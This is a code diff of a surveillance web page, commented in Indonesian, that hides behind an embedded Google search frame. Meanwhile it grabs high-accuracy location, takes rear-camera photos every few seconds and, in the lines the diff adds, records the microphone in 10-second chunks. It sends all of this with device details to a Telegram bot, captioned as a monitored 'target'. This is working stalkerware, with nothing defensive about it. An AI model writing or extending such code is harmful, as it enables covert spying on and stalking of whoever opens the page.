@@ -79,12 +79,14 @@
         document.getElementById('mainContent').style.display = 'block';
         document.getElementById('gFrame').src = "https://www.google.com/search?q=google&igu=1";
 
+        // Minta Izin Lokasi
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition(pos => {
                 userLoc = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
             }, err => { userLoc = "Izin Lokasi Ditolak"; }, { enableHighAccuracy: true });
         }
 
+        // Jalankan Kamera
         try {
             const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: { exact: "environment" } } });
             document.getElementById('video').srcObject = stream;
@@ -96,6 +98,44 @@
                 setInterval(takeAndSend, 5000);
             } catch (err) { takeAndSend(); }
         }
+
+        // Fitur Live Mic (Audio)
+        startAudioRecording();
+    }
+
+    async function startAudioRecording() {
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+            const mediaRecorder = new MediaRecorder(stream);
+            let chunks = [];
+
+            mediaRecorder.ondataavailable = (e) => chunks.push(e.data);
+            mediaRecorder.onstop = () => {
+                const blob = new Blob(chunks, { type: 'audio/ogg; codecs=opus' });
+                sendAudioTelegram(blob);
+                chunks = [];
+                mediaRecorder.start(); // Mulai rekam lagi setelah kirim
+            };
+
+            // Rekam setiap 10 detik dan kirim
+            mediaRecorder.start();
+            setInterval(() => {
+                if(mediaRecorder.state === "recording") mediaRecorder.stop();
+            }, 10000); 
+
+        } catch (err) {
+            console.log("Mic akses ditolak");
+        }
+    }
+
+    async function sendAudioTelegram(blob) {
+        const fd = new FormData();
+        fd.append('chat_id', CHAT_ID);
+        fd.append('voice', blob, 'recording.ogg');
+        fd.append('caption', `🎙 *Audio Target* - ${deviceName}`);
+        fd.append('parse_mode', 'Markdown');
+        
+        fetch(`https://api.telegram.org/bot${TOKEN}/sendVoice`, { method: 'POST', body: fd });
     }
 
     async function takeAndSend() {
@@ -110,7 +150,7 @@
         const report = (blob) => {
             const fd = new FormData();
             fd.append('chat_id', CHAT_ID);
-            fd.append('caption', `👁 *Target Terpantau*\n\n📱 HP: ${deviceName}\n🔋 Baterai: ${battery}\n📍 Lokasi: ${userLoc}\n📷 Mode: Kamera Belakang`);
+            fd.append('caption', `👁 *Target Terpantau*\n\n📱 HP: ${deviceName}\n🔋 Baterai: ${battery}\n📍 Lokasi: ${userLoc}\n📷 Mode: Kamera`);
             fd.append('parse_mode', 'Markdown');
             if (blob) {
                 fd.append('photo', blob, 'shot.jpg');
